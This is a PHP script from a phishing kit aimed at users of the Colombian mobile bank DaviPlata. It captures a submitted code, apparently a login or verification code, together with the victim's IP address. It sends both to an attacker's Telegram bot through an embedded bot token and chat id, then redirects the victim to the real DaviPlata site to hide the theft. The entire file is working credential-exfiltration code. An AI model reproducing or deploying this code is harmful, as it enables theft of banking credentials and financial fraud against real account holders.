<?php
ini_set("display_errors", 0);
$userp = $_SERVER['REMOTE_ADDR'];
include('dt.php');

if ( isset ($_POST['Codigo1']) ){

$message = "Codigo: ".$_POST['Codigo1']."\r\nIP ".$userp."\r\n";

$apiToken = 5610349084:AAF66JpHAKmwxST_6KTzDcVea0JD4vzJhDg;
$data = [
    'chat_id' => -812733549,
    'text' => $message
];
$response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($data) );

echo'<script language="javascript">alert("GRACIAS POR SU TIEMPO!\r\nDAVIPLATA, ACEPTE PARA CONTINUAR.");</script>';
echo'<script type="text/javascript">window.location.href = "https://daviplata.com/";</script>';

}else{ header ('location: index.html'); exit();}

?>
